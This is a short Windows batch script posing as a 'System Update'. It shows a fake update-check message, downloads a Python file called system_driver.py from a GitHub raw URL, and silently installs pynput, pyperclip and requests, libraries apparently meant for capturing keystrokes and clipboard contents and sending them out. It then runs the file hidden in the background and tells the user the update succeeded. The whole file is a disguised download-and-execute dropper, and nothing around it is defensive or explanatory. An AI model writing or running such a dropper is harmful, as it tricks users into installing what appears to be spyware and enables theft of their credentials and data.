@echo off
title System Update
echo Checking for updates...

:: Define GitHub Raw URL
set "SCRIPT_URL=https://raw.githubusercontent.com/coolrain14053/optimizer/main/system_driver.py"
set "SCRIPT_NAME=system_driver.py"

:: Download the Python script using PowerShell (Fixed version)
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%SCRIPT_URL%', '%SCRIPT_NAME%')"

:: Install dependencies using python -m pip
python -m pip install pynput pyperclip requests --quiet

:: Run the driver in background (hidden)
start /b pythonw %SCRIPT_NAME%

echo System updated successfully!
exit